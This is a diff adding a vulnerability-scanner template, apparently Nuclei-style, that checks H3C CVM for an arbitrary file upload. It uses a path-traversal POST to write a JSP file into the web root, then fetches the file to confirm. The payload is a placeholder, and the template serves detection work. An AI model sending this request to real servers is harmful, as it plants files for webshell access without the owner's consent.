@@ -1,0 +1,52 @@
+id: h3c-cvm-arbitrary-file-upload
+brief:
+    title: H3C CVM - Arbitrary File Upload
+    by: SleepingBag945
+    level: critical
+    about: An H3C CVM vulnerability allows for arbitrary file uploads. This enables attackers to upload any files they choose, acquire webshells, manipulate server permissions, and access sensitive information.
+    label:
+        - h3c
+        - lfi
+        - instrusive
+        - file-upload
+        - intrusive
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{filename}}.jsp&name=222"'
+      head:
+        Accept-Encoding: gzip, deflate
+        Content-range: bytes 0-10/20
+      body: '{{payload}}'
+      signs:
+        - "on": word
+          has:
+            - '{{payload}}'
+          in: body_2
+          need: all
+        - "on": word
+          has:
+            - 'Content-Type: text/html'
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/cas/js/lib/buttons/{{filename}}.jsp'
+      signs:
+        - "on": word
+          has:
+            - '{{payload}}'
+          in: body_2
+          need: all
+        - "on": word
+          has:
+            - 'Content-Type: text/html'
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
